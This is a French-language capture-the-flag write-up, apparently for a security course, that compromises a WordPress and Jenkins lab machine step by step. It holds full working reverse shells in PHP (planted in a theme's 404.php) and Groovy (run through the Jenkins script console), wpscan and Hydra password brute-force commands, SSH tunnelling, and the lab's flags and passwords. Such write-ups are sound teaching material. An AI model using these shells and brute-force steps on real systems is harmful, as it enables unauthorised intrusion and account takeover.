# Un Penene 🔳🔳

## Récupération du `user.txt`

> EPI{_SuN7_F3r1C1t_c4_M4n4Nc_1_P3p3N3_}

```bash
gobuster dir -w Tools/wordlists/dirbuster/directories.jbrofuzz -u http://<target>
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/95710c4c-d2a3-4ba9-810f-721e95dd8c76)

On remarque alors la présence de phpmyadmin et de wordpress.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/ad79cb4a-b1ea-4a43-bd83-f8e0527fd699)

Quand on tente de se rendre sur la page `http://<target>/blog/` on est redirigé vers `http://timetime.thm/blog/`. De ce fait on en déduit que si on indique à notre machine que cet url pointe vers l'adresse ip de notre cible, on pourra accéder à l'url car le domaine sera reconnu.

```
echo "<target>    timetime.thm" >> /etc/hosts;
```

Le contenu du fichier `/etc/hosts` doit être similaire à celui ci-dessous.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/8ddec213-579f-49c3-8227-6db9a67fa6e4)

Dorénavant en accédant à l'url `http://timetime.thm/blog/`, la page ci-dessous s'affiche.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/3879fa4b-4454-4a73-981f-82a7430e2d0e)

L'url de connexion au tableau de bord de base de wordpress est `/wp-admin`, en essayant cet url on est redirigé vers la-dite page.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/833db5b6-22fd-4195-8acc-545618c30f07)

On peut utiliser l'outils `wpscan` pour réaliser un bruteforce de wordpress (on précise `admin` car c'est un des usernames les plus commun).

```bash
wpscan --url http://timetime.thm/blog -U admin -P Tools/wordlists/rockyou.txt -t 50
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/5e7a3306-ebd7-4cd2-94a4-d7a88aa42111)

Les identifiants sont alors `admin` / `romania`.

Une fois le fomulaire de connexion de la page `/wp-admin` on accède au tableau de bord de l'application.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/e184d9fe-cea3-43d7-824d-ad8366546afd)

En utilisant [ce](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) repository github on peut mettre en place un reverse shell en php. Depuis l'onglet `Theme Editor` du menu `Appearance` on a accès à certains fichiers `php` editable, comme le 404.php qui nous permet d'exécuter le reverse shell lorsqu'on accède à cette page.

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '<host>';  // CHANGE THIS
$port = 9000;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 
```

> N'oubliez pas de sauvegarder en bas de la page.

On peut alors utiliser `netcat` depuis la machine hôte, qui permet de créer des sockets TCP ou UDP, que ce soit en connexion ou en attente de connexion. On précise le port configuré précedemennt (soit 9000).

```bash
nc -nlsp 9000
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/673aeffb-db52-450e-87d3-2ed112f18230)

En accédant à la page [404](http://timetime.thm//blog/wp-content/themes/twentyseventeen/404.php), on lance le reverse shell. Ce qui engendre une connexion dans le terminal dans lequel vous avez lancé la commande précédente.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/220d4242-3d90-49c1-b011-21cda34bbd67)

En regardant les différents emplacement accessible par l'utilisateur `www-data` sur le serveur, on trouve le dossier `opt` dans lequel sont présent les fichiers ci-dessous. 

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/ed606bb1-c497-45c4-8b31-226fc80718ba)

En regardant le contenu du fichier `wp-save.txt`, on trouve le mot de passe de l'utilisateur `squeezie`.

> time_time_best_single

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/42b26061-8117-42a9-9aa9-89640958b92e)

Nous pouvons désormais nous connecter en ssh à l'utilisateur `squeezie`.

```bash
ssh squeezie@<target> # Enter password `time_time_best_single`
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/a0111fe6-414f-4901-9b11-4021441a6495)

Dans le dossier `home` de cet utilisateur on trouve alors le flag `user.txt`.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/fd047b03-2911-474a-86d5-71b217b2ae2e)

## Récupération du `root.txt`

> EPI{D4nS4M_1n_T1m3_t1Me_4S4_C4_By3_bY3_By3}

D'après google, on peut déterminer que nous sommes dans un container docker de par la présence de l'interface `docker0` en entrant la commande `ip a`. 

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/a7a4149a-42af-4ffb-b718-917ceec73c5e)

Si nous sommes dans un container, on peut en déduire qu'il soit possible que le serveur en possède d'autres et/ou que d'autres applications sont présentes. On peut alors tenter de scanner les ports généralement utilisé pour le web avec la commande ci-dessous.

```bash
ps aux | grep 80
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/149470ec-71b5-4571-a47b-667f5475d234)

On observe qu'un container docker dont l'ip est `172.17.0.2` est exposé localement sur le port `8080`. En tentant de curl cet url on se rend compte qu'une application Jenkins est lancée dans ce container.

```bash
curl localhost:8080 # | head -1
curl localhost:8080/login
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/ec6575c6-f996-48af-98d8-4c78c8b05b6f)

On pourrait alors tenter de redigirer l'adresse de l'application Jenkins vers le localhost de la machine hôte.

```
ssh -L 40:172.17.0.2:8080 squeezie@timetime.thm # Need password of squeezie `time_time_best_single`
```

Dorénavant en accédant à la page `http://localhost:40` on arrive sur la page de connexion de Jenkins qui, comme vu précédemment, tourne dans le container docker. Afin de trouver les identifiants de cette page on pourrait utiliser Burp Suite mais hydra a été plus rapide dans cette situation.

```bash
git clone https://github.com/danielmiessler/SecLists
hydra 127.0.0.1 -s 40 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P SecLists/Passwords/10-million-password-list-top-10000.txt -w 5
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/00a4d86e-04c0-4254-b65e-a95f8317ce15)

Hydra trouve alors que le mot de passe correspondant au compte admin (qui est le compte par défaut de Jenkins) est `spongebob`. On peut alors se connecter et se rendre sur la page `/script`, qui nous permet d'exécuter des scripts. On peut utiliser [ce repository](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) qui permet de réaliser un reverse shell.

```Groovy
String host="<target>";
int port=9000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/211e57e2-a916-489e-8429-4770e1cbe599)

On peut alors utiliser `netcat` depuis la machine hôte, qui permet de créer des sockets TCP ou UDP, que ce soit en connexion ou en attente de connexion. On précise le port configuré précedemennt (soit 9000).

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/487cb815-e51c-4530-bb54-b5352fd1ea4c)

Ensuite en appuyant sur le bouton `Run` de la page `/script`, en attendant quelques secondes on voit que la connexion s'effectue que nous sommes connectés en tant que `jenkins`.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/ea3e6473-7a96-44bb-a8fc-ad13759f469e)

En cherchant comme pour le `user.txt` dans le dossier otp on trouve un fichier `note.txt` qui contient le mot de passe de l'utilisateur `root`.

> ambiance_skandal_tu_connais_deja

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/7961413a-fd80-4d5e-85e9-75b94c74d4a5)

On peut alors ensuite se connecter en ssh soit à `root` directement (je n'ai pas testé) soit à `squeezie` et ensuite switcher d'utilisateur.

```bash
ssh squeezie@<target> # Enter password `time_time_best_single`
su root # Enter password `ambiance_skandal_tu_connais_deja`
```

Ensuite dans le home de root (`/home/root`) on trouve le fichier `root.txt` qui contient le flag.

![image](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/de31f874-f1ea-4b26-abde-67a3d51f0ca5)
